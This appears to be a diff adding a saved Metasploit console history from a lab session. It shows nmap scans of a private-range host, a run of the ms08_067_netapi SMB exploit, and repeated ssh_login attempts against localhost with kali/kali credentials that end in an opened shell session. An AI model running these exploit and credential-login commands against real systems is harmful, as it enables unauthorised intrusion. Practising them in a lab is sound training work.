@@ -1,0 +1,42 @@
+msf6 auxiliary(scanner/ssh/ssh_login) > history > commands.txt
+1   search enum_processes
+2   use post/windows/gather/enum_processes
+3   search exploit/multi/http
+4   nmap -sV -p 80 192.168.18.80
+5   use exploit/windows/smb/ms08_067_netapi
+6   set RHOST 192.168.18.80
+7   run
+8   nmap -p 445 192.168.18.80
+9   clear
+10  earch ssh
+11  search ssh
+12  use auxiliary/scanner/ssh/ssh_login
+13  set RHOSTS 127.0.0.1   # Target VM (localhost)
+14  set RPORT 22           # SSH port
+15  set USERNAME <your_username>   # Replace with your username
+16  set PASSWORD <your_password>   # Replace with your password
+17  set USERNAME kali
+18  set PASSWORD kali
+19  exploit
+20  search ssh_login
+21  use auxiliary/scanner/ssh/ssh_login
+22  set RHOSTS 127.0.0.1   # Localhost (127.0.0.1) as the target
+23  set RPORT 22
+24  set USERNAME kali    # Assuming the username is 'kali'
+25  set PASSWORD kali    # Assuming the password is 'kali'
+26  exploit
+27  msfconsole
+28  use auxiliary/scanner/ssh/ssh_login
+29  set RHOSTS 127.0.0.1
+30  set RPORT 22
+31  set USERNAME kali
+32  set PASSWORD kali
+33  exploit
+34  sessions
+35  Active sessions
+36  ==================
+37  Id  Name  Type  Information  Connection
+38  --  ----  ----  -----------  ----------
+39  1   1     shell kali@kali   127.0.0.1:35687 -> 127.0.0.1:22
+40  sessions -i 1
+41  history > commands.txt
